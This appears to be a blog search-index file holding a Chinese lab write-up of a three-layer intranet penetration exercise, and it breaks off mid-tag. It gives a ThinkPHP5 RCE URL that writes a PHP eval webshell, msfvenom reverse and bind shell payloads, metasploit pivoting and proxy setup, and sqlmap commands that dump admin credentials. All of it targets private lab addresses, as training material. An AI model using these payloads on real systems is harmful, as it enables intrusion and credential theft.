<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CFS三层靶机内网渗透</title>
    <link href="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1>环境搭建</h1><h2 id="网卡设置">网卡设置</h2><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.jpg" class=""><h2 id="主机设置">主机设置</h2><ol><li><p>CentOS</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root密码：teamssix.com<br><br>此主机的IP地址：<br><span class="hljs-number">192.168.12.133</span><br><span class="hljs-number">192.168.22.128</span><br><br>宝塔后台登陆地址及密码：<br>地址：http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">12</span>.<span class="hljs-number">133</span>:<span class="hljs-number">8888</span>/a768f109/<br>账号：eaj3yhsl<br>密码：41bb8fee<br></code></pre></td></tr></table></figure></li><li><p>Ubuntu</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root密码：teamssix.com<br><br>此主机的IP地址：<br><span class="hljs-number">192.168.22.129</span><br><span class="hljs-number">192.168.33.128</span><br><br>宝塔后台登陆地址及密码：<br>地址：http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">22</span>.<span class="hljs-number">129</span>:<span class="hljs-number">8888</span>/2cc52ec0/<br>账号：xdynr37d<br>密码：123qwe..<br></code></pre></td></tr></table></figure></li><li><p>Win7</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">Administrator密码：teamssix.com<br><br>此主机的IP地址：<br><span class="hljs-number">192.168.33.33</span><br></code></pre></td></tr></table></figure></li><li><p>kali</p><p>192.168.12.130</p></li><li><p>宝塔配置</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.jpg" class=""></li></ol><h2 id="网络环境概述">网络环境概述</h2><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.jpg" class=""><p>现在假设只知道192.168.12.133主机，需要进行内网渗透</p><h1>渗透过程</h1><h2 id="打穿CentOS">打穿CentOS</h2><h3 id="信息搜集">信息搜集</h3><p>nmap扫描开放端口和服务</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.12.133</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.jpg" class=""><p>开放了80端口，先进行访问</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.jpg" class=""><p>用thinkphp5版本搭建的网站，这个版本的网站存在命令执行漏洞</p><p>以下命令可以查看php信息</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.12.133/index.php</span><br>?s=index/\think\app/invokefunction<br><span class="hljs-variable">&amp;function</span>=call_user_func_array<br><span class="hljs-variable">&amp;vars</span>[<span class="hljs-number">0</span>]=phpinfo<br><span class="hljs-variable">&amp;vars</span>[<span class="hljs-number">1</span>][]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.jpg" class=""><p>使用searchexploit也可以，但是kali给出的攻击命令比较少，且结果不容易看</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.jpg" class=""><h3 id="获取CentOS的webshell">获取CentOS的webshell</h3><p>写入webshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://192.168.12.133/index.php</span><br><span class="language-xml">?s=index/think\app/invokefunction</span><br><span class="language-xml">&amp;function=call_user_func_array</span><br><span class="language-xml">&amp;vars[0]=file_put_contents　　　　　　　　　　//使用file_put_contents函数</span><br><span class="language-xml">&amp;vars[1][]=shell.php　　　　　　　　　　　　　//webshell文件名</span><br><span class="language-xml">&amp;vars[1][]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.jpg" class=""><p>蚁剑连接</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/11.jpg" class=""><p>发现了第一个flag！</p><p>flag{e2D3aFdasde}</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.jpg" class=""><p>利用蚁剑打开终端，发现另一个IP：191.168.22.128，说明存在其他的内网主机</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.jpg" class=""><h3 id="获取主机权限">获取主机权限</h3><p>先用msf创建一个后门，就是在桌面创建一个elf格式的木马，再开启监听，通过刚才蚂剑上传上去，再直接控制终端他的终端运行这个木马即可监听到</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.12.130 <span class="hljs-attribute">lport</span>=6666 -f elf &gt; test.elf<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.jpg" class=""><p>图中IP写错了，应该为kali的IP</p><p>将test.elf通过蚁剑上传</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.jpg" class=""><h4 id="启动msf">启动msf</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.jpg" class=""><h4 id="msf获得权限">msf获得权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.12.130(攻击机的IP！)<br><span class="hljs-built_in">set</span> lport 6666<br>run<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.jpg" class=""><p>执行“run”或“exploit”之后，在蚁剑中运行刚刚上传的test.elf</p><p>不过第一次运行时提示权限不足，则先对文件赋权</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">777</span> test.elf<br></code></pre></td></tr></table></figure><p>然后可以正常执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./test.elf<br></code></pre></td></tr></table></figure><p>运行后msf拿到彻底拿到CentOS的权限</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/19.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20.jpg" class=""><h2 id="打穿Ubuntu">打穿Ubuntu</h2><h3 id="信息搜集-2">信息搜集</h3><h4 id="利用nmap扫描另一张网卡的主机">利用nmap扫描另一张网卡的主机</h4><p>首先需要输入命令<code>background</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/21.jpg" class=""><p>发现很久了都没有扫描结果，这是因为网段设置问题，这里扫描是用的kali的ip扫描，模拟的环境中kali和centos是公网主机，所以可以直接扫到，而现在扫的属于内网网段，所以扫不出结果</p><p>所以需要：用msf自带的<u>探测网络接口的模块（get_local_subnets）</u>和<u>查看路由的模块(autoroute -p)</u>来进一步进行信息探测</p><p>先输入<code>back</code>退出当前session，不要“exit”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> get_local_subnets<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/22.jpg" class=""><blockquote><p>分析</p><p>centos处于三个网段内，刚才nmap扫出来只有两个网段，这说明122的网段明显就是出于迷惑的目的，</p><p>而且当前没有路由 （路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程，就相当于把我们要传输的数据先传输到该路由，再发往目标，centos上又没有msf，所以可以通过设置路由的方式把我们的请求从centos发出，这样就可以在kali上访问到centos的ip了）</p><p>所以我们要来添加一个路由(autoroute -s)，因为我们已经在12的网段内，所以添加的路由肯定添加22网段的，就简单理解为我们建立了一个攻击机kali和该网段的隧道</p></blockquote><h3 id="建立网段隧道">建立网段隧道</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> autoroute -s <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span>  # 添加一条道<span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span>的路由<br><span class="hljs-attribute">run</span> autoroute -p  # 查看路由<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/23.jpg" class=""><p>现在就可以与 22这个网段进行通信了，利用nmap扫描该内网网段下存活了哪些主机（注意：这里使用nmap扫描要禁用ping检测，即-Pn，因为不一定能ping通）</p><p>查看地址解析记录arp -a确定第二层目标为192.168.22.128</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><h3 id="msf代理设置">msf代理设置</h3><p>这里的路由还有一个缺陷，它只能在这个msf建立的会话上使用，假如新开一个终端使用nmap扫描，还是扫不到</p><p>所以需要msf的代理配置，当然msf有自己的代理模块，就是 auxiliary/server/socks_proxy  ，来开启代理服务，下面是参照博客的设置，srvport是端口随便定，只要不被占用</p><h4 id="使用代理模块auxiliary-server-socks-proxy">使用代理模块auxiliary/server/socks_proxy</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/server/socks_<br><span class="hljs-keyword">use</span> 0<br><span class="hljs-keyword">set</span> srvport 2222<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">version</span> 4a<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/24.jpg" class=""><h4 id="修改kali的代理配置">修改kali的代理配置</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vi</span> /etc/proxychains4.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>在该文件的最下面一行，把ip更改为kali攻击机的ip，端口更改为刚刚配置模块的端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks4</span> <span class="hljs-number">192.168.12.130</span> <span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/25.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/26.jpg" class=""><h4 id="通过代理执行命令">通过代理执行命令</h4><p>此时在指令前输入proxychains4即可走代理来执行该命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap -sT -Pn <span class="hljs-number">192.168.22.129</span> -p <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/27.jpg" class=""><h3 id="获取Ubuntu的webshell">获取Ubuntu的webshell</h3><h4 id="主机发现">主机发现</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap -sn -PR <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>比较慢，而且不知道为什么是隔3个IP扫一下</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/28.jpg" class=""><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> sudo netdiscover -r <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>不知道为什么只有12网段的结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap <span class="hljs-number">192.168.22.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h4 id="端口探测">端口探测</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> nmap -sT -Pn <span class="hljs-number">192.168.22.129</span> -p <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>上面已有截图</p><p>说是不能直接访问，但是浏览器按照原代理设置仍然可以访问Ubuntu192.168.22.129（参考博客说需要按照右图配置）</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/29.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/30.jpg" class=""><p>F12直接提示注入点…</p><p><code>/index.php?r=vul&amp;keyword=1</code></p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/35.jpg" class=""><h4 id="SQL注入">SQL注入</h4><p><strong>爆破数据库名</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks4</span>:<span class="hljs-string">//192.168.12.130</span><span class="hljs-function">:2222</span> <span class="hljs-params">--dbs</span><br></code></pre></td></tr></table></figure><p>一些选择</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">you have <span class="hljs-keyword">not</span> declared cookie(s), <span class="hljs-keyword">while</span> <span class="hljs-keyword">server</span> wants <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> its own (<span class="hljs-string">&#x27;PHPSESSID=3kn9melp0fi...7kvvba3u81&#x27;</span>). <span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> use those [Y/n] y<br>it looks <span class="hljs-keyword">like</span> the back-<span class="hljs-keyword">end</span> DBMS <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;Oracle&#x27;</span>. <span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> skip test payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] n<br><span class="hljs-keyword">for</span> the remaining tests, <span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">include</span> <span class="hljs-keyword">all</span> tests <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;Oracle&#x27;</span> extending provided <span class="hljs-keyword">level</span> (<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> risk (<span class="hljs-number">1</span>) <span class="hljs-keyword">values</span>? [Y/n] y<br><span class="hljs-keyword">GET</span> parameter <span class="hljs-string">&#x27;keyword&#x27;</span> <span class="hljs-keyword">is</span> vulnerable. <span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> keep testing the others (<span class="hljs-keyword">if</span> <span class="hljs-keyword">any</span>)? [y/N] n<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/36.jpg" class=""><p><strong>爆破表</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks4</span>:<span class="hljs-string">//192.168.12.130</span><span class="hljs-function">:2222</span> -D bagecms <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/37.jpg" class=""><p><strong>爆破列名</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks4</span>:<span class="hljs-string">//192.168.12.130</span><span class="hljs-function">:2222</span> -D bagecms -T bage_admin <span class="hljs-params">--columns</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/38.jpg" class=""><p><strong>爆破字段</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> <span class="hljs-params">--proxy=socks4</span>:<span class="hljs-string">//192.168.75.132</span><span class="hljs-function">:2222</span> -D begacms -T bage_admin -C username,password <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/39.jpg" class=""><p>拿到管理员的用户名和密码：admin；46f94c8de14fb36680850768ff1b7f2a</p><p>通过MD5在线解密得到密码明文：123qwe</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/40.jpg" class=""><h4 id="以管理员身份登录">以管理员身份登录</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirb http:<span class="hljs-comment">//192.168.22.129</span><br></code></pre></td></tr></table></figure><p>目录扫描发现，有一个robots.txt文件，访问发现里面有管理员相关网站路径</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/41.jpg" class=""><p>访问，找到登录入口</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/42.jpg" class=""><p>成功登录，得到第二个flag： flag{eS3sd1IKarw}</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/43.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/44.jpg" class=""><h4 id="注入一句话木马">注入一句话木马</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/45.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/46.jpg" class=""><p>访问：<code>http://192.168.22.129/index.php?r=tag</code></p><p>蚁剑连接，拿到webshell权限</p><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/47.jpg" class=""><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/48.jpg" class=""><p>至此得到了Ubuntu的webshell权限</p><h4 id="获取Ubuntu的主机权限">获取Ubuntu的主机权限</h4><blockquote><p>同理，再生成针对乌班图的木马，这里需要注意的是<strong>木马的shell只能用正向</strong>，因为我们是搭建隧道来访问的乌班图，因为我们正常访问是访问不到的，但是它处于内网中也访问不到我们，而且让他通过隧道来找我们是不现实的，所以还是得我们通过隧道去找他，所以只能正向</p></blockquote><p><strong>生成木马</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/bind_tcp lport=5555 -f elf &gt; test2.elf<br></code></pre></td></tr></table></figure><p>通过蚁剑上传</p><p><strong>msf</strong></p><blockquote><p>同样的msf新开一个页面开启监听，但是这里要注意，msf新开一个页面后之前的那个页面的所有东西都用不了，所以不能直接msfconsole打开，msf这里也需要走代理 ，就是在用proxychains msfconsole来启动msf，再设置payload，设置lport，设置phost，即可开启监听</p></blockquote><p>通过代理启动msf</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure><img 